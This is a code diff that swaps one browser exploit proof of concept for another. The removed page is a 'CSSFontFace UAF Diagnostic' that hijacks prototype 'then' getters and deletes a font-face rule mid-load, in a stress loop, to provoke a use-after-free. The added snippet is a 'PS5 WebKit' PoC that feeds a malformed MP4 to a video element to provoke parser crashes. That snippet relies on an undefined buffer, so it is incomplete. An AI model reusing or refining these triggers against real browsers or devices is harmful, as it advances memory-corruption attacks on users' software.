@@ -1,159 +1,23 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>CSSFontFace UAF Diagnostic</title>
-<style>
-@font-face {
-    font-family: "diagff";
-    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
-    unicode-range: U+0041;
-}
-@font-face {
-    font-family: "diagff";
-    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
-    unicode-range: U+0042;
-}
-</style>
-</head>
-<body>
-<h2>CSSFontFace UAF Diagnostic</h2>
-<div id="output" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 400px;"></div>
-
+// PoC HTML for PS5 WebKit
 <script>
-const KEY = "ff_diag_checkpoints";
-const runId = Date.now().toString(36);
-const out = [];
+const mp4Blob = new Blob([malformedMp4ArrayBuffer], {type: 'video/mp4'});
+const url = URL.createObjectURL(mp4Blob);
 
-function push(msg) {
-    const line = `[${runId}] ${msg}`;
-    out.push(line);
-    console.log(line);
-    document.getElementById('output').textContent = out.join('\n');
-    
-    try {
-        const old = JSON.parse(localStorage.getItem(KEY) || "[]");
-        old.push(line);
-        localStorage.setItem(KEY, JSON.stringify(old.slice(-200)));
-    } catch (_) {}
-}
+const video = document.createElement('video');
+video.src = url;
 
-async function runCase(doDeleteRule) {
-    push(`\n=== Case: deleteRule=${doDeleteRule} ===`);
-    
-    const style = document.createElement("style");
-    style.textContent = `
-@font-face {
-    font-family: "diagff";
-    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
-    unicode-range: U+0041;
-}
-@font-face {
-    font-family: "diagff";
-    src: local("Arial"), local("Helvetica"), local("DejaVu Sans"), local("sans-serif");
-    unicode-range: U+0042;
-}`;
-    
-    document.head.appendChild(style);
-    
-    const probe = document.createElement("span");
-    probe.id = "probe";
-    probe.textContent = "AB";
-    probe.style.fontFamily = "diagff";
-    document.body.appendChild(probe);
-    document.body.offsetTop;
-    
-    push(`initial style resolved; cssRules=${style.sheet.cssRules.length}`);
-    
-    let fired = false;
-    const targets = [FontFace.prototype, FontFaceSet.prototype, Array.prototype];
-    const saved = targets.map(t => [t, Object.getOwnPropertyDescriptor(t, "then")]);
-    
-    function restore() {
-        for (const [obj, desc] of saved) {
-            if (desc) Object.defineProperty(obj, "then", desc);
-            else delete obj.then;
-        }
-    }
-    
-    function handler(where) {
-        if (fired) return;
-        fired = true;
-        push(`then getter fired via ${where}`);
-        
-        try {
-            if (doDeleteRule) {
-                style.sheet.deleteRule(0);
-                push("deleteRule(0) executed");
-            } else {
-                push("deleteRule skipped (control case)");
-            }
-        } catch (e) {
-            push(`deleteRule error: ${e.name}: ${e.message}`);
-        }
-        
-        try {
-            document.body.offsetTop;
-            getComputedStyle(probe).fontFamily;
-            push("style/layout forced");
-        } catch (e) {
-            push(`style/layout force error: ${e.name}: ${e.message}`);
-        }
-        
-        restore();
-    }
-    
-    // تثبيت getters على كل الـ prototypes
-    for (const target of targets) {
-        const name = 
-            target === FontFace.prototype ? "FontFace.prototype" :
-            target === FontFaceSet.prototype ? "FontFaceSet.prototype" :
-            "Array.prototype";
-        
-        Object.defineProperty(target, "then", {
-            configurable: true,
-            get() {
-                handler(name);
-                const savedDesc = saved.find(x => x[0] === target)?.[1];
-                return savedDesc && savedDesc.value;
-            }
-        });
-    }
-    
-    try {
-        push("calling document.fonts.load");
-        const faces = await document.fonts.load('16px "diagff"', "AB");
-        push(`document.fonts.load resolved; faces=${faces.length}`);
-    } catch (e) {
-        push(`document.fonts.load rejected: ${e.name}: ${e.message}`);
-    } finally {
-        restore();
-        style.remove();
-        probe.remove();
-        push(`case end: getter fired=${fired}`);
-    }
-}
+// Monitor for crashes
+video.onerror = (e) => {
+    console.log('Error:', video.error.code, video.error.message);
+    // Error 4 = MEDIA_ERR_SRC_NOT_SUPPORTED
+    // Error 3 = MEDIA_ERR_DECODE
+    // Custom error = potential crash indicator
+};
 
-(async () => {
-    push("=== CSSFontFace UAF Diagnostic Start ===");
-    
-    // Case 1: بدون deleteRule (control)
-    await runCase(false);
-    
-    // Case 2: مع deleteRule (exploit)
-    await runCase(true);
-    
-    // Stress loop - تكرار السيناريو
-    push("\n=== Stress Loop (25 iterations) ===");
-    for (let i = 0; i < 25; i++) {
-        push(`stress iteration ${i}`);
-        await runCase(true);
-    }
-    
-    push("\n=== DONE ===");
-})().catch((e) => {
-    push(`fatal error: ${e && e.stack || e}`);
-});
+video.onloadedmetadata = () => {
+    console.log('Metadata loaded — parser survived initial pass');
+};
+
+// Force parsing
+video.play().catch(e => console.log('Play error:', e));
 </script>
-</body>
-</html>
